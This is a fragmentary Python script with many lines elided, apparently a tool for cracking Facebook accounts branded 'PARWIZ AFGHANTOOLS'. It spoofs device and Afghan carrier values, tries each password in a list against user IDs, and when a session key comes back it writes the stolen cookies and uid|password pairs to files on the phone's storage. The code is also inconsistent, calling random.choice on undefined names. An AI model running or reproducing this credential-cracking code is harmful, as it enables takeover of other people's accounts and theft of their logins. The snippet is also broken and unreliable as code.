...
\033[1;31m------------------------------------------------
"""                                     \33[37;41m\t WELLCOME TO PARWIZ AFGHANTOOLS\33[0;m  
...
Dnh = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
Dnh= random.choice(Dnh1)
def fking1(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fblc = device['fblc']
                        fbcr = sim_id
                        Fjj=random.choice(DNH)
                        Fjjj=random.choice(DNH)
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/DNH-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/DNH-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
